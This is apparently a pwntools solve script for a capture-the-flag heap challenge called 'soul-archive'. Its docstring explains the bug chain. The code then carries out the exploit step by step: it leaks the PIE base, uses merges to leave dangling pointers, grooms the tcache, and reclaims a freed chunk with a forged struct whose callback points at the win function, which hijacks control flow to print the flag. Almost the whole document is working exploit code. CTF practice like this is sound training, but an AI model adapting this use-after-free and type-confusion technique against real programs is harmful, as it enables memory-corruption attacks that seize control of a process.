#!/usr/bin/env python3
"""
soul-archive-thanos  --  UAF + type confusion (PIE, canary, Full RELRO)

Bug chain
---------
* merge_souls():  s1 = archive[a], s2 = archive[b]
                  cached_souls[cache_count++] = s2;   free(s2);
                  -> archive[b] is NEVER cleared => dangling pointer (UAF)
* transfer_soul(): malloc(0x40) and fills it with a "TransferRecord"
                  whose layout matches a "Soul" (0x40 bytes) -- and the
                  last field lands exactly on Soul->inspect (+0x38).
* inspect_soul():  call [soul+0x38](soul)  => rip control with rdi = soul.

Goal
----
soul_ascension(soul) prints the flag when
    total_captured > 5  &&  merges == 3  &&  erased == 1
    && soul->essence == 0x50574e534f554c53 ("SLUOSNWP")

So: capture 6, merge 3x (each frees one chunk), erase 1, then reclaim a
dangling chunk with transfer_soul() and point its +0x38 at soul_ascension.
"""
from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'info'

ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
BIN = os.path.join(ROOT, 'solve/soul/soul_archive_patched')
elf = ELF(BIN, checksec=False)

MAGIC = 0x50574e534f554c53          # "SLUOSNWP" - what soul_ascension wants
INSPECT_HUMAN = 0x13a9              # used to rebuild the PIE base from a leak
SOUL_ASCENSION = 0x14fb             # real win()

def start():
    if args.REMOTE:
        return remote(args.HOST or 'localhost', int(args.PORT or 1337))
    return process(BIN)


def main():
    io = start()
    io.recvuntil(b'> ')

    def cmd(n):
        io.sendline(str(n).encode())

    def capture(name, typ, essence):
        cmd(1)
        io.sendlineafter(b'Soul name: ', name)
        io.sendlineafter(b'Type: ', str(typ).encode())
        io.sendlineafter(b'Initial Essence (hex value e.g. 1000): ', essence)
        io.recvuntil(b'> ')

    def inspect(i):
        cmd(2)
        io.sendlineafter(b'Enter vessel index (0-7): ', str(i).encode())
        return io.recvuntil(b'> ')

    def merge(a, b):
        cmd(3)
        io.sendlineafter(b'First vessel index to merge: ', str(a).encode())
        io.sendlineafter(b'Second vessel index to merge: ', str(b).encode())
        io.recvuntil(b'> ')

    def erase(i):
        cmd(4)
        io.sendlineafter(b'Enter vessel index to erase (0-7): ', str(i).encode())
        io.recvuntil(b'> ')

    def transfer(realm, tid, flags, timestamp, entropy, callback):
        cmd(5)
        io.sendlineafter(b'Realm of origin: ', realm)
        io.sendlineafter(b'Transfer ID (decimal): ', str(tid).encode())
        io.sendlineafter(b'Entropy Flags (decimal): ', str(flags).encode())
        io.sendlineafter(b'Timestamp (hex e.g. 1337): ', timestamp)
        io.sendlineafter(b'Raw Entropy / Essence (hex): ', entropy)
        io.sendlineafter(b'Audit Callback Address (hex, 0 for default): ', callback)
        out = io.recvuntil(b'> ')
        return out

    # ---- 1. six souls (slots 0..5) -------------------------------------
    for i in range(6):
        capture(b'soul%d' % i, 1, b'1000')

    # ---- 2. leak the PIE base ------------------------------------------
    out = inspect(0)
    leak = int(re.search(rb'Inspect Callback: (0x[0-9a-f]+)', out).group(1), 16)
    pie = leak - INSPECT_HUMAN
    log.success('inspect_human leak = %#x  ->  PIE base = %#x', leak, pie)
    win = pie + SOUL_ASCENSION
    log.info('soul_ascension() = %#x', win)

    # ---- 3. three merges: free chunks 1, 3, 5 (archive[] left dangling)
    merge(0, 1)      # total essences add up, s2 = chunk1 freed
    merge(2, 3)      # chunk3 freed
    merge(4, 5)      # chunk5 freed
    log.info('merges = 3, archive[1], archive[3], archive[5] now dangle')

    # ---- 4. one erase: frees chunk0, souls_erased = 1 -------------------
    erase(0)
    # tcache[0x50] LIFO:  chunk0 -> chunk5 -> chunk3 -> chunk1

    # ---- 5. reclaim chunk0 (unreachable, archive[0] = NULL) ------------
    transfer(b'junk', 1, 1, b'0', b'0', b'0')

    # ---- 6. reclaim chunk5 == archive[5] (dangling) and forge a Soul ---
    #  Timestamp          -> Soul.essence  (+0x20)  = magic
    #  Raw Entropy        -> Soul.type     (+0x28)
    #  Audit Callback     -> Soul.inspect  (+0x38)  = soul_ascension
    transfer(b'thanos', 2, 2, hex(MAGIC)[2:].encode(), b'0', hex(win)[2:].encode())

    # ---- 7. inspect(5) -> call [chunk5+0x38](chunk5) --------------------
    out = inspect(5)
    print(out.decode(errors='replace'))

    m = re.search(rb'OWASP\{[^}]*\}', out)
    if m:
        log.success('FLAG = %s', m.group().decode())
    else:
        log.failure('no flag found')
    io.close()


main()
